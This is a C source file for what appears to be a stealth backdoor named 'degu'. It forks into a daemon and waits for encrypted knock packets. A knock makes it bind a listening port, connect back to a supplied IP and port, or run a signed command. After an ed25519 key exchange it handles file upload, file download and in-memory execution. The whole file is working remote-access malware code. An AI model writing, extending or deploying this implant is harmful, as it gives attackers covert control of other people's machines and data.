#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>


#include "degu.h"

void create_daemon(){

    int status;
    pid_t pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    waitpid(pid, &status, WNOHANG);

    umask(0);
    chdir("/");
}

/**
 after knock bot send his ephemeral key generated at startup
 > bot_pubkey 32bytes
degu calculate ed25519 shared secret and cipher it
<
 * **/

void knock_handle(int sock){

    unsigned char pub[32];

    memcpy(&pub, bot_public_key, 32);
    xnock( pub, 32);

    TRACE("sending bot public key.");

    send(sock, pub, 32, 0);
    
    unsigned char header[32] = {0};
    unsigned char secret[32] = {0};
    struct timeval tv;
    tv.tv_sec = TIMEOUT;
    tv.tv_usec = 0;

    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    int i = recv(sock, &header, 32, MSG_PEEK);

    if (i > 0){

        ed25519_key_exchange(secret, public_key, bot_private_key);

        xdata(secret, header, 32);
        
        if ((memcmp(header,DEGU_EXE_UL,4) == 0) || 
            (memcmp(header,DEGU_EXE_MEMFD,4) == 0 ) ){
            knock_handle_exe(sock, header, secret);
        }else if (memcmp(header,DEGU_UP,4) == 0 ){
            knock_handle_up(sock, header, secret);
        }else if (memcmp(header,DEGU_DL,4) == 0 ){
            knock_handle_dl(sock, header, secret);
        }else{
            TRACE("bad degu magic WRONG KEY !!!");
            goto fail;
        }
    }else{
        TRACE("timeout");
    }
fail:
    shutdown(sock,SHUT_RDWR);
    close(sock);
    exit(EXIT_FAILURE);
}

void knock_bind(unsigned int port){

    int pid = fork();

    if (pid < 0)
        return ;
    if (pid > 0){
       wait( NULL );
       return;
    }
    create_daemon();

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);

    int sock,client,opt;

    if ( (sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0){
        TRACE("error creating socket");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR ,&opt, sizeof(opt))) {
        TRACE("setsockopt reuseaddr");
        exit(EXIT_FAILURE);
    }

    if (bind(sock, (struct sockaddr *)&serv_addr,sizeof(serv_addr))<0) {
        TRACE("bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(sock, 3) < 0) {
        TRACE("listen failed");
        exit(EXIT_FAILURE);
    }

    int addrlen = sizeof(serv_addr);
    int tm = 0;

    fcntl(sock, F_SETFL, O_NONBLOCK);

    while ( tm < TIMEOUT ){
        if ((client = accept(sock, (struct sockaddr *)&serv_addr,  (socklen_t*)&addrlen))<0) {
            sleep(1);
            tm+=1;
        } else {
            TRACE("accept client %i",client);
            close(sock);
            knock_handle(client);
            break;
        }
    }
    close(sock);
    exit(EXIT_SUCCESS);
}


void knock_cb(unsigned char *dst,unsigned int port){

    int pid = fork();

    if (pid < 0)
        return;
    if (pid > 0){
       wait( NULL );
       return;
    }

    create_daemon();

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy( &serv_addr.sin_addr.s_addr, dst, 4);

    int sock;

    if ( (sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0){
        TRACE("error creating socket");
        exit(EXIT_FAILURE);
    }

    if( connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        TRACE("error connecting cb");
        exit(EXIT_FAILURE);
    }
    knock_handle(sock);
    close(sock);
    exit(EXIT_SUCCESS);
}

/**
 *
 proto
 random char[2]|header[2] char =>
    if header == 0xb00b  // bind connect
        |port uint16_t
    if header == 0xc411  // back connect
        |ip[4] char|port unint16_t
    if header == 0xc057  // ghost exe
    |len[2]|cmd[len]|sig[64]
    |garbage char[970+] (< 1300)
 **/

int knock(unsigned char *data,size_t len){
    data = data + STRIPUDP;

    xnock( data , len);

    unsigned int off = 32;

    if(data[0 + off] == 0xb0 && data[1 + off] == 0x0b ){
        int port = data[2 + off] | data[3 + off] << 8;
        TRACE("decryped bind port %i", port );
        knock_bind(port);
        return 1;

    }else if(data[0 + off] == 0xc4 && data[1 + off] == 0x11){
        unsigned int port = data[6 + off] | data[7 + off] << 8;
        unsigned char *dst = data + 2 + off;
        TRACE("decryped back connect %u", port );
        knock_cb( dst , port);
        return 1;

    }else if(data[0 + off] == 0xc0 && data[1 + off] == 0x57){
        unsigned char *cmd = data + 4 + off;
        size_t len = data[2 + off] | data[3 + off] << 8;
        if (len > DEGU_GHOST_MAX_CMD)
            return 0;
        TRACE("decryped ghost exe len %i", len );
        knock_ghost_exe( cmd , len );
        return 1;

    }else{
        TRACE("unable to decrypt");
        HEXDUMP("unknown", data, 32);
    }
    return 0;
}
